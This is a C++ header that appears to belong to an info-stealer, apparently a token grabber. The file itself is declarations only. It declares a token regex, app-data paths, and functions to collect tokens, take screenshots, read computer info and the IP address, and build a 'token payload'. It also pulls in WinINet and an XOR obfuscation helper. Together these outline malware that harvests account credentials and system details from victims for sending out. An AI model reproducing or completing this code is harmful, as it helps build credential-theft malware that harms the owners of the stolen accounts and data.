#pragma once
#include <GdiPlus.h>
#include <vector>
#include <string>
#include <array>

#include "xor.hpp"

#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib,"gdiplus.lib")
#pragma comment(lib,"Gdi32.lib")

namespace helpers {
	extern std::string regex_token;

	extern std::string roaming;

	extern std::string local;

	extern std::array<std::pair<std::string, std::string>, 7> paths;

	std::string read_file(const char* filename);

	void take_screenshot(std::string file);

	std::string get_computer_info();

	std::string get_ip();

	std::vector<std::string> get_tokens();

	std::string prepare_token_payload(std::vector<std::string> tokens);
}
